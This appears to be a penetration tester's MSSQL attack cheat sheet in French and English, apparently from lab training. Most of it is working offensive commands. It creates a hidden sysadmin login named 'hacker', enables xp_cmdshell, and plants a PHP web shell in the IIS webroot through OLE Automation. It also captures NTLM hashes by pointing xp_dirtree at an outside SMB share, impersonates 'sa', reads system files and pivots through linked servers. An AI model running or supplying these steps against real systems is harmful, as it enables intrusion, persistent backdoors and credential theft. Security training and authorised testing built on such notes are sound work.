---
public: true 
#Tags: vhost, hashes, lfi, password-spraying, potato
---

Port : 1433

## Enumeration

### nmap
```shell-session
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $TARGET_IP
```

### metasploit
```shell-session
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248

rhosts => 10.129.201.248


msf6 auxiliary(scanner/mssql/mssql_ping) > run

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Mssqlclient.py (impacket)
```sql
-- Internal Authentication (no fomzin prefix)
mssqlclient.py -p 1433  $USER:$PASS@$TARGET_IP 

--
mssqlclient.py Administrator@10.129.201.248 -windows-auth

-- Local workstation account authentication (no need to add WIN-02 to hosts)
mssqlclient.py -p 1433 -windows-auth WIN-02/mssqlsvc:princess1@$TARGET_IP      
```

## Commandes utiles
### Enumeration / Exploration
```sql
-- Get version
select @@version;
-- Get user
select user_name();
-- List admin users
SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals WHERE    IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name

-- Check if we are sysadmin
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin'); -- retourne 0 si nous ne sommes pas membre
-- Get databases
SELECT name FROM master.dbo.sysdatabases;
select name from sys.databases
-- Use database
USE master

-- Get table names
SELECT table_name FROM <databaseName>.INFORMATION_SCHEMA.TABLES;



-- List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

-- Identify Linked Servers
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0        <== isremote = 0 ===> LINKED SERVER

-- List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;

```

### Exploitation
#### Création de compte
```sql
------------------------------------------------------------------------
-- Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
EXEC sp_addsrvrolemember 'hacker', 'sysadmin';
```

#### Exécution de commandes

```
------------------------------------------------------------------------
-- Tentative d activation de xp_cmdshell  (si droits suffisants)
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1;
-- To update the currently configured value for advanced options.  
RECONFIGURE;
-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1;
-- To update the currently configured value for this feature.  
RECONFIGURE
--  Execution de commande (si xp_cmdshell est activé)
xp_cmdshell 'whoami';
```

#### Ecriture dans un fichier
```
------------------------------------------------------------------------
-- Creation de fichier fia OLE Automation Procedures
-- Activation
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
-- Création de fichier
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

#### Lecture d'un fichier
```
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

#### Capture de Hash

```
-- XP_DIRTREE
EXEC master..xp_dirtree '\\10.10.110.17\share\'

-- XP_SUBDIRS
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

#### User Impersonate

```
-- Liste des users que l'on peut "impersonate"
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO

-- Exploitation
user master; -- db sur laquelle on est sur d'avoir les droits
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
REVERT; -- retourne aux droits précédents
```

### Linked Server
Si on a un serveur lié (voir énumération sur cette page), on peut exécuter des requêtes à distance sur cette machine :

```
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

## Outils utiles

#### sqlcmd (Windows)
```
# -y 30 -Y 30 augmentent la visibilité des résultat (attention aux performances)
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

# ATTENTION : cet utilitaire nécessite la saisie du mot GO à la ligne terminant chaque requête ! (pas besoin de ';' dans cet outil)
```

#### sqsh (Linux)
```
# Authentificatino Interne (SQL Server)
sqsh -S $TARGET_IP -U $AD_USER -P $AD_PASSWORD

# Authentification locale ou domaine
sqsh -S $TARGET_IP -U .\\$AD_USER -P $AD_PASSWORD 
```

#### mssqlclient.py (Impacket)

```
 mssqlclient.py -p 1433 julio@10.129.203.7 
```



There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.